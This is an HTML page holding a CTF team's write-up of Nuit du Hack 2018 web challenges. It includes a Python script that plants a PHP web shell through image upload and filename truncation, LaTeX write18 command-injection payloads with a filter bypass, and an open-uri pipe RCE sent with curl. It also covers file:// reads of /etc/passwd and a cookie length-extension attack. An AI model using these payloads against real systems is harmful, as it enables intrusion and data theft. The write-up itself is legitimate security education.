@@ -1,0 +1,373 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Nuit du Hack CTF Quals 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#pixeditor-(bookgin)">pixeditor-(bookgin)</a>
+    
+                <a class="dropdown-item" href="#linked-out-(bookgin)">linked-out-(bookgin)</a>
+    
+                <a class="dropdown-item" href="#crawl-me-maybe-(unsolved,-written-by-bookgin)">crawl-me-maybe-(unsolved,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#coingame-(bookgin)">coingame-(bookgin)</a>
+    
+                <a class="dropdown-item" href="#wawacoin-(unsolved,-written-by-bookgin)">wawacoin-(unsolved,-written-by-bookgin)</a>
+    
+                <a class="dropdown-item" href="#cryptolol-(solved-by-sasdf)">cryptolol-(solved-by-sasdf)</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#pixeditor-(bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">pixeditor-(bookgin)</span>
+            </a>
+    
+<a href="#linked-out-(bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">linked-out-(bookgin)</span>
+            </a>
+    
+<a href="#crawl-me-maybe-(unsolved,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crawl-me-maybe-(unsolved,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#coingame-(bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">coingame-(bookgin)</span>
+            </a>
+    
+<a href="#wawacoin-(unsolved,-written-by-bookgin)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">wawacoin-(unsolved,-written-by-bookgin)</span>
+            </a>
+    
+<a href="#cryptolol-(solved-by-sasdf)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">cryptolol-(solved-by-sasdf)</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="nuit-du-hack-ctf-quals-2018"><a class="header-link" href="#nuit-du-hack-ctf-quals-2018"></a>Nuit du Hack CTF Quals 2018</h1>
+
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h2 id="reverse"><a class="header-link" href="#reverse"></a>reverse</h2>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="pixeditor-(bookgin)"><a class="header-link" href="#pixeditor-(bookgin)"></a>PixEditor (bookgin)</h3>
+<p>In this challenge, we can POST a list of RGBA pixels, with specific format JPG, PNG, BMP, GIF. After sending the request to the server, we can download the image we just uploaded. The filename will remain the same.</p>
+<pre class="hljs"><code><span class="hljs-attr">data</span>=[<span class="hljs-number">255</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>...]
+<span class="hljs-attr">name</span>=image.JPG
+<span class="hljs-attr">format</span>=JPG</code></pre><p>My intuition is to upload a web shell. However, I&#39;ve tried lot of filenames but they all failed. It seems the filename is properly parsed by php <code>basename()</code>.</p>
+<p>Next, I wonder what will happend if I&#39;m trying to create a filename which is longer than 255 bytes, because the <a href="https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits">maximum filename length</a> for <code>ext4</code> is 255. To my surprise, a filename with only 55 bytes gets truncated!</p>
+<ul class="list">
+<li>POST filename <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.bmp</code></li>
+<li>The server saves the file as <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx</code></li>
+</ul>
+<p>The rest is trivial. We just need to manipulate the pixels to create a web shell. Pleases check my script for details.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.4</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> json
+
+payload = <span class="hljs-string">'''&lt;?php
+system($_GET["j"]);'''</span>
+
+bmp = []
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(payload), <span class="hljs-number">3</span>):
+    bmp += list(payload[i:i+<span class="hljs-number">3</span>].encode())[::<span class="hljs-number">-1</span>] + [<span class="hljs-number">0x00</span>]
+bmp += [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">4096</span> - len(bmp))]
+payload = dict(
+    data=json.dumps(bmp),
+    name=<span class="hljs-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRST.phpXYZ.BMP'</span>,
+    format=<span class="hljs-string">'BMP'</span>
+)
+print(requests.post(<span class="hljs-string">'http://pixeditor.challs.malice.fr/save.php'</span>, data=payload).text)</code></pre><p>Just <code>j=cat /flag</code> and win.</p>
+<p>After I already got the flag, one of my teammate found this in the javascript. However, I didn&#39;t notice that.</p>
+<p><code>inputName.maxLength = 45; // 50 - Len(Extension) - Filename will be truncated if len &gt; 50</code></p>
+<h3 id="linked-out-(bookgin)"><a class="header-link" href="#linked-out-(bookgin)"></a>Linked Out (bookgin)</h3>
+<p>We can upload a YAML config file, and the website will render the content through LaTeX.</p>
+<p>Our first try is to insert some latex syntax <code>\texttt{GG} \textbf{greatest}</code>. It gets rendered.</p>
+<p>How about some evil RCE latex syntax?</p>
+<pre class="hljs"><code><span class="hljs-tag">\<span class="hljs-name">immediate</span></span><span class="hljs-tag">\<span class="hljs-name">write</span></span>18{ls &gt; aaa.txt}
+<span class="hljs-tag">\<span class="hljs-name">input</span><span class="hljs-string">{aaa.txt}</span></span></code></pre><p>We soon found the flag is in <code>/flag</code>. Nevertheless, we fail to cat it out. We only got a parsing error. That&#39;s weird as I&#39;m sure we have read permission via <code>ls -all /flag</code>.</p>
+<p>After a few tries, we found <code>cat Makefle</code>, <code>pwd</code> are giving us parsing error. I wonder if there is a WAF. A quick PoC <code>echo NDH</code> and <code>echo a</code> solves the mystery - it&#39;s WAFed. The underscore is WAFed as well.</p>
+<p>So we just bypass it with powerful <code>sed</code>. Here is the payload:</p>
+<pre class="hljs"><code>-<span class="ruby"> <span class="hljs-string">'\immediate\write18{cat /flag | sed "s/_/Q/g" | sed "s/NDH/WWW/g"&gt; see}'</span>
+</span>-<span class="ruby"> <span class="hljs-string">'\input{see}'</span></span></code></pre><h3 id="crawl-me-maybe-(unsolved,-written-by-bookgin)"><a class="header-link" href="#crawl-me-maybe-(unsolved,-written-by-bookgin)"></a>Crawl Me Maybe (unsolved, written by bookgin)</h3>
+<p>The website will crawl the user-provided URL and displays the content. A quick test <code>url[]=</code> leads to an error which leaks the ruby source code:</p>
+<pre class="hljs"><code><span class="hljs-keyword">require</span> <span class="hljs-string">'open-uri'</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">'nokogiri'</span>
+
+
+set <span class="hljs-symbol">:bind</span>, <span class="hljs-string">'0.0.0.0'</span>
+set <span class="hljs-symbol">:port</span>, <span class="hljs-number">8080</span>
+
+
+get <span class="hljs-string">'/'</span> <span class="hljs-keyword">do</span>
+  @title = <span class="hljs-string">'Crawl Me Maybe!'</span>
+  erb <span class="hljs-symbol">:index</span>
+<span class="hljs-keyword">end</span>
+
+post <span class="hljs-string">'/result'</span> <span class="hljs-keyword">do</span>
+  @title = <span class="hljs-string">'Crawl Me Maybe!'</span>
+  url = params[<span class="hljs-string">"url"</span>]
+
+  <span class="hljs-keyword">if</span> /sh<span class="hljs-params">|dash|</span>bash<span class="hljs-params">|rbash|</span>zsh/.match(url) <span class="hljs-params">||</span> url.match(<span class="hljs-string">'flag'</span>) <span class="hljs-params">||</span> url.match(<span class="hljs-string">'txt'</span>) <span class="hljs-params">||</span> url.index(<span class="hljs-string">'*'</span>) != <span class="hljs-literal">nil</span> <span class="hljs-params">||</span> (url.index(<span class="hljs-string">'|'</span>) != <span class="hljs-literal">nil</span> &amp;&amp; !(url.index(<span class="hljs-string">'cat'</span>) != <span class="hljs-literal">nil</span> <span class="hljs-params">||</span> url.index(<span class="hljs-string">'ls'</span>) != <span class="hljs-literal">nil</span>))
+    @result = <span class="hljs-string">"Attack detected"</span>
+    erb <span class="hljs-symbol">:error</span>
+  <span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">begin</span>
+      page = open(url)
+    <span class="hljs-keyword">rescue</span> StandardError =&gt; e
+      @result = <span class="hljs-string">"Invalide url"</span>
+      erb <span class="hljs-symbol">:error</span>
+    <span class="hljs-keyword">else</span>
+      <span class="hljs-keyword">begin</span>
+        page = Nokogiri::HTML(page) { <span class="hljs-params">|config|</span> config.strict }
+        @result = <span class="hljs-string">"Page well formed !"</span>
+        @content = page.text
+        erb <span class="hljs-symbol">:result</span>
+      <span class="hljs-keyword">rescue</span> Nokogiri::HTML::SyntaxError =&gt; e
+        @result = <span class="hljs-string">"caught exception: <span class="hljs-subst">#{e}</span>"</span>
+        erb <span class="hljs-symbol">:error</span>
+      <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">end</span>
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span></code></pre><ol class="list">
+<li><code>open-uri</code> is very dangerous. <code>open(&#39;| ls&#39;)</code> results in RCE, while <code>open(&#39;/etc/passwd&#39;)</code> results in local file leaks.</li>
+<li>CHECK THE WAF CAREFULLY (we fail to do so). It seems working, but in fact, <code>| ls</code> is still a valid payload.</li>
+</ol>
+<p>Payload:</p>
+<pre class="hljs"><code><span class="hljs-comment"># locate the flag</span>
+$ curl <span class="hljs-string">'http://crawlmemaybe.challs.malice.fr/result'</span> --data <span class="hljs-string">'url=| ls &gt;/dev/null; find / | grep fla'</span>
+<span class="hljs-regexp">/home/</span>challenge<span class="hljs-regexp">/src/</span>.flag.txt
+
+<span class="hljs-comment"># get the flag</span>
+$ curl <span class="hljs-string">'http://crawlmemaybe.challs.malice.fr/result'</span> --data <span class="hljs-string">'url=| ls &gt;/dev/null; cat /home/challenge/src/.fla?.t?t'</span>
+NDH{CUrly_Ruby_J3p53n}</code></pre><p>This one is acctually very simple, but we are too tired to solve this...... Never stay up late playing CTf, guys.</p>
+<h3 id="coingame-(bookgin)"><a class="header-link" href="#coingame-(bookgin)"></a>CoinGame (bookgin)</h3>
+<p>The website is a online <code>curl</code> service, with PHP as the backend.</p>
+<p><code>file:///etc/passwd</code> still works lika a charm, and what&#39;s more intriguing is that there is a user named <code>tftp</code>.</p>
+<p>Let&#39;s get information as more as possible:</p>
+<ul class="list">
+<li>source code: <code>file:///var/www/html/curl.php</code><ul class="list">
+<li>PHP curl: We can use <code>gopher</code>, though it&#39;s useless in the challenge. Refer to <a href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit">SSRF bible</a>.</li>
+</ul>
+</li>
+<li>OS: file:///etc/os-release</li>
+<li>tftp config file: <code>file:///etc/default/tftpd-hpa</code>
+<code>`</code><h1 id="/etc/default/tftpd-hpa"><a class="header-link" href="#/etc/default/tftpd-hpa"></a>/etc/default/tftpd-hpa</h1>
+</li>
+</ul>
+<p>TFTP_USERNAME=&quot;tftp&quot;
+TFTP_DIRECTORY=&quot;/home/CoinGame&quot;
+TFTP_ADDRESS=&quot;0.0.0.0:69&quot;
+TFTP_OPTIONS=&quot;--secure --create&quot;
+<code>`</code></p>
+<p>Nevertheless, we are not able to connect to the tftp remotely. Then, we tried to dig some files under <code>/home/CoinGame</code> but none of them works. We got stuck here.......</p>
+<p>Suddenly, there arises inspiration in my mind. I start googling the author <code>Designed by totheyellowmoon</code>, accidently finding that he has only one repo, which is named <code>CoinGame</code>.</p>
+<p>Next, just crawl all the contents thorugh <code>file:///home/CoinGame/README.md</code> .... and diff with the repo. We found lots of images are not the same, and they contatins the flag.</p>
+<p>Hmm, I don&#39;t think this challenge is well-designed.</p>
+<h3 id="wawacoin-(unsolved,-written-by-bookgin)"><a class="header-link" href="#wawacoin-(unsolved,-written-by-bookgin)"></a>WaWaCoin (unsolved, written by bookgin)</h3>
+<p>In the login page, if the username doesn&#39;t not exist, we&#39;ll get <code>bad username</code>. Then, through a quick enumeration we found <code>admin</code> exists.</p>
+<p>In the manager page, we are set a cookie by the server, <code>session=757365723d64656d6f|9183ff6055a46981f2f71cd36430ed3d9cbf6861</code>. The first part is <code>user=demo</code> in hex, and the second part is a 20 bytes SHA1-hash. Manipulating the <code>user=admin</code> gets nothing, as the second part SHA1 seems like a signature. Therefore, the server will validate the signature and the first part.</p>
+<p>Later we found the category of the problem is updated to <code>crypto/web</code>, so length extension attack comes to my mind.</p>
+<p>However, we only send the payload to <code>/stealmoney</code> and <code>/login</code>. What&#39;s worse, we doesn&#39;t follow the redirect. In fact, one of the payload readlly works, but we send to the wrong API. Sending to <code>/stealmoney</code> will always redirect you to other page. The correct one is <code>/manager</code>.</p>
+<p>You can check <a href="https://gist.github.com/Becojo/17dbd49b5e8f25d9d7534afc2ed76c64">@Becojo&#39;s script</a> for more detail. It seems that appending <code>;user=admin</code> or <code>&amp;user=admin</code> both works.</p>
+<p>@sasdf, @sces60107 and I acctually spent 6+ hours on the frustrating challenge (sob).</p>
+<h3 id="cryptolol-(solved-by-sasdf)"><a class="header-link" href="#cryptolol-(solved-by-sasdf)"></a>Cryptolol (solved by sasdf)</h3>
+<p>To be completed</p>
+        </article>
+      </div>
+    </div>
+  </body>
+</html>
